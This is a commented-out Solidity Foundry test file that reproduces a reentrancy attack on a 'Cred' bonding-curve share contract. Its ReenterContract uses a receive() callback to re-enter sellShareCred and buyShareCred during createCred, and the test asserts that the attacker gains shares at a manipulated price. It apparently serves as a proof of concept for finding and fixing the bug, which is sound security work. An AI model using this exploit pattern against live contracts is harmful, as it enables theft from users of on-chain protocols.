// // SPDX-License-Identifier: Unlicense
// pragma solidity 0.8.25;

// import { PRBTest } from "@prb/test/src/PRBTest.sol";
// import { Test } from "forge-std/Test.sol";
// import { console2 } from "forge-std/console2.sol";
// import { ECDSA } from "solady/utils/ECDSA.sol";
// import { ICred } from "../src/interfaces/ICred.sol";

// import { Settings } from "./helpers/Settings.sol";

// contract ReenterContract {
//     uint256 counter;
//     address owner;
//     ICred cred;

//     modifier onlyOwner() {
//         if (msg.sender != owner) revert();
//         _;
//     }

//     constructor(address _cred) payable {
//         owner = msg.sender;
//         cred = ICred(_cred);
//     }

//     function deposit(
//         uint256 _amount,
//         bytes calldata data,
//         bytes calldata sig,
//         uint16 buyR,
//         uint16 sellR
//     )
//         public
//         onlyOwner
//     {
//         counter++;
//         cred.createCred{ value: _amount }(address(this), data, sig, buyR, sellR);
//     }

//     function reenter() public {
//         if (counter == 1) {
//             counter++;
//             cred.sellShareCred(1, 1, 0);
//         }
//         if (counter == 2) {
//             counter++;
//             cred.buyShareCred{ value: address(this).balance }(1, 501, 0);
//         }
//     }

//     receive() external payable {
//         reenter();
//     }
// }

// contract TestReentrancy is Settings {
//     uint256 expiresIn;

//     function setUp() public override {
//         super.setUp();
//         expiresIn = START_TIME + 100;
//     }

//     function _createCred(string memory credType, string memory verificationType, bytes32 merkleRoot) internal {
//         vm.warp(START_TIME + 1);
//         vm.startPrank(participant);
//         uint256 credId = 1;
//         uint256 supply = 0;
//         uint256 amount = 1;

//         uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);
//         string memory credURL = "test";
//         bytes memory signCreateData = abi.encode(
//             expiresIn, participant, 31_337, address(bondingCurve), credURL, credType, verificationType, merkleRoot
//         );
//         bytes32 createMsgHash = keccak256(signCreateData);
//         bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
//         (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
//         if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
//         cred.createCred{ value: buyPrice }(participant, signCreateData, abi.encodePacked(cr, cs), 0, 0);
//         vm.stopPrank();
//     }

//     function test_credCreatorReentersToManipulatePrice() public {
//         address rex = makeAddr("rex");

//         vm.warp(START_TIME + 1);
//         vm.startPrank(rex);
//         vm.deal(rex, 1_000_000e18);

//         ReenterContract attackContract = new ReenterContract{ value: 1_000_000e18 }(address(cred));

//         uint256 credId = 1;
//         uint256 supply = 0;
//         uint256 amount = 1;

//         uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(credId, supply, amount);

//         console2.log("Buy price: ", buyPrice);

//         string memory credURL = "test";

//         bytes memory signCreateData = abi.encode(
//             expiresIn, address(attackContract), 31_337, address(bondingCurve), credURL, "BASIC", "SIGNATURE", 0x0
//         );

//         bytes32 createMsgHash = keccak256(signCreateData);
//         bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);

//         (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
//         if (cv != 27) cs = cs | bytes32(uint256(1) << 255);

//         attackContract.deposit(1_000_000e18, signCreateData, abi.encodePacked(cr, cs), 100, 100);

//         //check balance of attack contract
//         assertEq(cred.getShareNumber(1, address(attackContract)), 501, "balance of attack contract");
//         // 5807634168336673346
//         vm.stopPrank();
//     }

//     function test_NoReenterSellAction() public {
//         vm.deal(participant, 1_000_000e18);
//         _createCred("BASIC", "SIGNATURE", 0x0);
//         // 1060510510510510
//         vm.startPrank(participant);

//         vm.warp(block.timestamp + 10 minutes + 1 seconds);

//         uint256 currentSupply = cred.getCurrentSupply(1);
//         assertEq(currentSupply, 1, "current supply");
//         uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, currentSupply, 500);
//         uint256 maxPrice = bondingCurve.getBuyPriceAfterFee(1, currentSupply, 501);
//         console2.log("Buy price: ", buyPrice);
//         cred.buyShareCred{ value: buyPrice }(1, 500, maxPrice);
//         // 5806573657826162835
//         assertEq(cred.getShareNumber(1, address(participant)), 501, "balance of participant");
//         // 1060510510510510 + 5806573657826162835
//     }
// }
